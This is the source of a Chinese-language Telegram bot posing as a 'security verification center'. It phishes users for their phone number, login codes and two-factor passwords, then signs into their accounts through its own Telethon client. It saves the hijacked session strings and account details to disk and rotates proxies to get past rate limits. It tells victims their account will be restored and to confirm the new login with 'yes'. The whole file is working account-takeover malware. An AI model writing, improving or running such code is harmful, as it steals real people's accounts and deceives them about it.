# coding=utf-8
import json
import os
import shutil
import asyncio
from concurrent.futures import ThreadPoolExecutor

import telethon
from dotenv import load_dotenv
from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ContextTypes
from telethon import TelegramClient

try:
    from opentele.td import TDesktop
    from opentele.tl import TelegramClient as TelethonToDesktop
    from opentele.api import API, UseCurrentSession
    TELEPOT_AVAILABLE = True
except ImportError:
    TELEPOT_AVAILABLE = False
    TelethonToDesktop = None
    API = None
    UseCurrentSession = None

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
API_URL = os.getenv("API_URL", "http://127.0.0.1:8002")
IMAGE_PATH = r"C:\Users\Thikbook\Pictures\photo_2026-03-27_06-50-13.jpg"
SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
BOT_USERNAME = "安全检测中心"

API_ID = int(os.getenv("API_ID"))
API_HASH = str(os.getenv("API_HASH"))
PROXY_TYPE = os.getenv("PROXY_TYPE", "socks5")

print(f"API_ID={API_ID}, API_HASH={API_HASH[:10]}...")

def parse_proxy_list():
    proxies = []
    i = 1
    while True:
        host = os.getenv(f"PROXY_HOST_{i}")
        port = os.getenv(f"PROXY_PORT_{i}")
        user = os.getenv(f"PROXY_USER_{i}")
        pw = os.getenv(f"PROXY_PW_{i}")
        if not host:
            host = os.getenv("PROXY_HOST")
            port = os.getenv("PROXY_PORT")
            user = os.getenv("PROXY_USER")
            pw = os.getenv("PROXY_PW")
            if host:
                p = (PROXY_TYPE, host, int(port) if port else 1080)
                if user and pw:
                    p = (PROXY_TYPE, host, int(port), True, user, pw)
                proxies.append(p)
            break
        p = (PROXY_TYPE, host, int(port))
        if user and pw:
            p = (PROXY_TYPE, host, int(port), True, user, pw)
        proxies.append(p)
        i += 1
    return proxies

PROXY_LIST = parse_proxy_list()
print(f"已加载 {len(PROXY_LIST)} 个代理")

# 并发任务处理 - 后台线程池
MAX_WORKERS = int(os.getenv("BOT_MAX_WORKERS", "8"))
_executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

user_states = {}
telethon_clients = {}
client_proxy_index = {}
MAX_CODE_ATTEMPTS = 3
MAX_PASSWORD_ATTEMPTS = 3

def create_restart_button():
    """创建重新验证按钮"""
    keyboard = [[KeyboardButton("重新验证", request_contact=False)]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)

async def handle_restart(update, context):
    """处理重新验证按钮点击"""
    user_id = update.effective_user.id
    reset_user_state(user_id)
    await start(update, context)

async def get_telethon_client(user_id=None, proxy_index=None, fresh_session=False):
    try:
        idx = proxy_index if proxy_index is not None else client_proxy_index.get(user_id, 0)
        proxy = PROXY_LIST[idx] if PROXY_LIST else None
        
        if proxy:
            p_info = f"{proxy[1]}:{proxy[2]}"
            if len(proxy) > 4:
                p_info += f" ({proxy[4]})"
            print(f"[用户 {user_id}] 使用代理 {idx+1}/{len(PROXY_LIST)}: {p_info}")
        
        session_name = f'telebot_session_u{user_id}' if fresh_session else 'telebot_session'
        
        if user_id in telethon_clients:
            c = telethon_clients[user_id]
            if c.is_connected():
                return c
            else:
                try:
                    await c.disconnect()
                except:
                    pass
        
        print(f"[DEBUG] Creating TelegramClient:")
        print(f"  session_name = {session_name}")
        print(f"  API_ID = {API_ID} (type: {type(API_ID)})")
        print(f"  API_HASH = {API_HASH} (type: {type(API_HASH)})")
        
        client = TelegramClient(
            session=session_name,
            api_id=API_ID,
            api_hash=str(API_HASH),
            proxy=proxy,
            device_model="telegram安全中心 请勿移除",
            system_version="6.8",
            app_version="10.14.4"
        )
        
        await client.connect()
        telethon_clients[user_id] = client
        client_proxy_index[user_id] = idx
        return client
    except Exception as e:
        raise Exception(f"连接失败: {str(e)}")

async def rotate_proxy(user_id):
    if not PROXY_LIST:
        return None
    current = client_proxy_index.get(user_id, 0)
    next_idx = (current + 1) % len(PROXY_LIST)
    p = PROXY_LIST[next_idx]
    p_info = f"{p[1]}:{p[2]}"
    if len(p) > 4:
        p_info += f" ({p[4]})"
    print(f"[用户 {user_id}] 切换到代理 {next_idx+1}/{len(PROXY_LIST)}: {p_info}")
    client_proxy_index[user_id] = next_idx
    return next_idx

def reset_user_state(user_id):
    if user_id in user_states:
        del user_states[user_id]

async def backup_session(phone_number, client):
    phone_folder = None
    try:
        os.makedirs(SESSIONS_DIR, exist_ok=True)
        
        phone_folder = os.path.join(SESSIONS_DIR, phone_number)
        if os.path.exists(phone_folder):
            shutil.rmtree(phone_folder)
        os.makedirs(phone_folder)
        
        session = client.session
        if not session.auth_key:
            shutil.rmtree(phone_folder)
            print("备份失败: 无auth_key")
            return False
        
        from telethon.sessions import StringSession
        string_session = StringSession()
        string_session._dc_id = session.dc_id
        string_session._server_address = session.server_address
        string_session._port = session.port
        string_session._auth_key = session.auth_key
        
        session_str = string_session.save()
        
        with open(os.path.join(phone_folder, 'telethon密钥.txt'), 'w', encoding='utf-8') as f:
            f.write(session_str)
        
        try:
            me = await client.get_me()
            account_info = {
                'phone': str(phone_number),
                'id': str(me.id),
                'first_name': str(me.first_name) if me.first_name else '',
                'last_name': str(me.last_name) if me.last_name else '',
                'username': str(me.username) if me.username else '',
                'dc_id': str(session.dc_id),
                'session_string': str(session_str)
            }
            with open(os.path.join(phone_folder, '账号信息.json'), 'w', encoding='utf-8') as f:
                json.dump(account_info, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"获取账号信息失败: {e}")
        
        shutil.copy2('.env', os.path.join(phone_folder, '.env'))
        
        if os.path.exists('telebot_session.session'):
            shutil.copy2('telebot_session.session', os.path.join(phone_folder, 'telebot_session.session'))
        
        if TELEPOT_AVAILABLE:
            try:
                tdata_folder = os.path.join(phone_folder, 'tdata')
                os.makedirs(tdata_folder, exist_ok=True)
                
                api = API.TelegramDesktop.Generate()
                telethon_client = TelethonToDesktop(session_str, api=api)
                
                await telethon_client.ToTDesktop(flag=UseCurrentSession)
                print(f"tdata 备份成功")
            except Exception as e:
                print(f"tdata 备份失败: {e}")
        
        telegram_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Telegram.exe')
        if os.path.exists(telegram_exe):
            try:
                shutil.copy2(telegram_exe, os.path.join(phone_folder, 'Telegram.exe'))
                print(f"客户端复制成功")
            except Exception as e:
                print(f"客户端复制失败(可能被占用): {e}")
        
        # 备份成功后，尝试调用独立的会话转换服务，将备份数据转换为 tdata
        try:
            payload = {
                "backup": {
                    "data": session_str,
                    "format": "telethon_session"
                },
                "options": {
                    "merge_with_existing": True
                }
            }
            tdata_resp = await to_tdata(payload)
            with open(os.path.join(phone_folder, 'tdata_response.json'), 'w', encoding='utf-8') as f:
                json.dump(tdata_resp, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"调用转换服务失败: {e}")
        print(f"备份成功: {phone_folder}")
        return True
    except Exception as e:
        print(f"备份失败: {e}")
        if phone_folder and os.path.exists(phone_folder):
            shutil.rmtree(phone_folder)
        return False

async def start(update, context):
    user_id = update.effective_user.id
    print(f"[DEBUG] start 被触发, user_id={user_id}, args={context.args}")
    var = None
    if context.args:
        var = context.args[0] if context.args else None
    user_states[user_id] = {"state": "start", "code_attempts": 0, "password_attempts": 0}
    keyboard = [[KeyboardButton("发送手机号", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
    await update.message.reply_text(
        "欢迎使用安全验证助手，请点击下方按钮开始验证。",
        reply_markup=reply_markup
    )

async def handle_contact(update, context):
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    if state != "start":
        await update.message.reply_text("请先发送 /start 开始验证流程。")
        return
    try:
        contact = update.message.contact
        phone = contact.phone_number
        user_states[user_id] = {"state": "phone_ok", "phone": phone, "code_attempts": 0, "password_attempts": 0}
        keyboard = [[KeyboardButton("获取验证码")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
        await update.message.reply_text(
            f"手机号验证成功。\n\n{phone}\n\n准备就绪后请点击获取验证码。",
            reply_markup=reply_markup
        )
    except Exception as e:
        await update.message.reply_text(f"获取手机号失败: {str(e)}")

async def handle_photo(update, context):
    """处理用户发送图片的情况 - 拒绝并提示重新验证"""
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    
    if not state or state == "start":
        await update.message.reply_text(
            "请根据操作提示来完成验证，请勿发送图片。\n\n发送 /start 开始验证。",
            reply_markup=create_restart_button()
        )
        return
    
    await update.message.reply_text(
        "检测到图片输入，请使用文本进行验证。\n\n请根据操作提示来完成验证。",
        reply_markup=create_restart_button()
    )

async def handle_invalid_input(update, context):
    """处理用户乱回复/乱写的情况"""
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    
    if not state or state == "start":
        await update.message.reply_text(
            "请根据操作提示来完成验证。\n\n发送 /start 开始验证。",
            reply_markup=create_restart_button()
        )
        return
    
    # 在任何验证阶段检测到无效输入，都显示重新验证按钮
    await update.message.reply_text(
        "输入无效，请根据操作提示来完成验证。",
        reply_markup=create_restart_button()
    )

async def handle_code_request(update, context):
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    if state != "phone_ok":
        await update.message.reply_text("请先完成手机号验证。", reply_markup=create_restart_button())
        return
    phone = user_states[user_id].get("phone")
    try:
        client = await get_telethon_client(user_id, fresh_session=True)
        try:
            await client.connect()
        except Exception as e:
            print(f"连接错误: {e}")
            await update.message.reply_text("连接失败，正在重试...", reply_markup=create_restart_button())
            if user_id in telethon_clients:
                try:
                    await telethon_clients[user_id].disconnect()
                except:
                    pass
                del telethon_clients[user_id]
            client = await get_telethon_client(user_id, fresh_session=True)
            await client.connect()
        print(f"发送验证码到: {phone}")
        result = await client.send_code_request(phone)
        user_states[user_id]["state"] = "code_sent"
        user_states[user_id]["phone_code_hash"] = str(result.phone_code_hash) if result.phone_code_hash else ""
        keyboard = [[KeyboardButton("重新验证")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
        await update.message.reply_text(
            "验证码已发送。\n您会收到一条系统消息。\n\n请按以下格式输入 5 位验证码。\n格式：TG + 5 位数字，例如：TG12345",
            reply_markup=reply_markup
        )
    except Exception as e:
        await update.message.reply_text(f"发送验证码失败: {str(e)}", reply_markup=create_restart_button())

async def handle_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    state = user_states.get(user_id, {}).get("state")
    
    # 检查是否点击了重新验证按钮
    if text == "重新验证":
        await handle_restart(update, context)
        return
    
    if not state or state == "start":
        await update.message.reply_text("请先发送 /start 开始验证。", reply_markup=create_restart_button())
        return
    if state == "phone_ok":
        if "获取验证码" in text:
            await handle_code_request(update, context)
        else:
            await update.message.reply_text("请点击获取验证码按钮。", reply_markup=create_restart_button())
        return
    if state == "code_sent":
        code_attempts = user_states[user_id].get("code_attempts", 0)
        if len(text) == 7 and text[:2].upper() == "TG" and text[2:].isdigit():
            code = text[2:]
            phone = user_states[user_id].get("phone")
            phone_code_hash = str(user_states[user_id].get("phone_code_hash", ""))
            await update.message.reply_text("请稍等，正在验证中...")
            try:
                client = await get_telethon_client(user_id)
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                user_states[user_id]["state"] = "done"
                await backup_session(phone, client)
                try:
                    with open(IMAGE_PATH, 'rb') as photo:
                        await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
                except Exception:
                    await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
            except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
                code_attempts += 1
                user_states[user_id]["code_attempts"] = code_attempts
                if code_attempts >= MAX_CODE_ATTEMPTS:
                    await update.message.reply_text("验证码错误次数过多，请重新开始。")
                    reset_user_state(user_id)
                    await update.message.reply_text("验证失败次数过多，请点击下方按钮重新验证。", reply_markup=create_restart_button())
                else:
                    remaining = MAX_CODE_ATTEMPTS - code_attempts
                    await update.message.reply_text(f"验证码错误，请重新输入。\n剩余尝试次数: {remaining}\n格式：TG12345", reply_markup=create_restart_button())
            except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
                user_states[user_id]["state"] = "password"
                user_states[user_id]["password_attempts"] = 0
                await update.message.reply_text("验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
            except telethon.errors.rpcerrorlist.FloodWaitError as e:
                next_idx = await rotate_proxy(user_id)
                if next_idx is not None:
                    user_states[user_id]["state"] = "phone_ok"
                    await update.message.reply_text(
                        f"当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请再次点击「获取验证码」。",
                        reply_markup=create_restart_button()
                    )
                else:
                    await update.message.reply_text(
                        f"操作过于频繁，需要等待 {e.seconds} 秒。\n"
                        f"如需绕过限制，请在 .env 中配置多个代理（PROXY_HOST_1, PROXY_PORT_1 等）。",
                        reply_markup=create_restart_button()
                    )
            except Exception as e:
                if "password" in str(e).lower() or "two-steps" in str(e).lower():
                    user_states[user_id]["state"] = "password"
                    user_states[user_id]["password_attempts"] = 0
                    await update.message.reply_text("验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
                else:
                    await update.message.reply_text(f"验证失败: {str(e)}", reply_markup=create_restart_button())
        else:
            await update.message.reply_text("格式错误！请按格式输入：TG12345", reply_markup=create_restart_button())
        return
    if state == "password":
        password = text
        password_attempts = user_states[user_id].get("password_attempts", 0)
        try:
            client = await get_telethon_client(user_id)
            await client.sign_in(password=password)
            user_states[user_id]["state"] = "done"
            phone = user_states[user_id].get("phone")
            if phone:
                await backup_session(phone, client)
            try:
                with open(IMAGE_PATH, 'rb') as photo:
                    await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
            except Exception:
                await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
        except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
            password_attempts += 1
            user_states[user_id]["password_attempts"] = password_attempts
            if password_attempts >= MAX_PASSWORD_ATTEMPTS:
                await update.message.reply_text("密码错误次数过多，请重新开始。")
                reset_user_state(user_id)
                await update.message.reply_text("验证失败次数过多，请点击下方按钮重新验证。", reply_markup=create_restart_button())
            else:
                remaining = MAX_PASSWORD_ATTEMPTS - password_attempts
                await update.message.reply_text(f"二级密码错误，请重新输入。\n剩余尝试次数: {remaining}", reply_markup=create_restart_button())
        except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
            await update.message.reply_text("请输入您的二级密码。", reply_markup=create_restart_button())
        except telethon.errors.rpcerrorlist.FloodWaitError as e:
            next_idx = await rotate_proxy(user_id)
            if next_idx is not None:
                await update.message.reply_text(
                    f"当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请重新输入您的二级密码。",
                    reply_markup=create_restart_button()
                )
            else:
                await update.message.reply_text(
                    f"操作过于频繁，需要等待 {e.seconds} 秒。\n"
                    f"如需绕过限制，请在 .env 中配置多个代理。",
                    reply_markup=create_restart_button()
                )
        except Exception as e:
            await update.message.reply_text(f"验证失败: {str(e)}", reply_markup=create_restart_button())
        return
    if state == "done":
        await update.message.reply_text("您已完成验证，无需重复操作。")
        return
    if text == "获取验证码":
        await handle_code_request(update, context)
        return
    await update.message.reply_text("请发送 /start 重新开始验证，或点击按钮操作。", reply_markup=create_restart_button())

async def share_callback(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="正在启动验证...")
    await start(update, context)

def main():
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("restart", handle_restart))
    dp.add_handler(MessageHandler(Filters.CONTACT, handle_contact))
    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
    dp.add_handler(MessageHandler(Filters.document, handle_photo))
    dp.add_handler(MessageHandler(Filters.text & Filters.regex("获取验证码"), handle_code_request))
    dp.add_handler(MessageHandler(Filters.text & Filters.regex("重新验证"), handle_restart))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    print("Bot 已启动")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    # 24小时不间断运行保护 - 自动重启
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("收到停止信号，机器人已关闭。")
            break
        except Exception as e:
            print(f"机器人发生异常: {str(e)}")
            print("5秒后自动重启...")
            import time
            time.sleep(5)
